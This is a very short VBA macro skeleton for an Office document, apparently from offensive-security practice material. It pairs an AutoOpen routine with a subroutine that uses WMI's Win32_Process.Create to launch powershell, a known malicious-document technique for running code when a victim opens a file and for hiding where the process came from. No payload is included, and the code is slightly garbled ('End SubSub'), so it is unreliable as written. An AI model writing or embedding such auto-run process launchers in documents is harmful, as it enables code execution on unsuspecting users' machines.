Sub MyMacro
  strArg = "powershell"
  GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
End SubSub

AutoOpen()
  Mymacro
End Sub
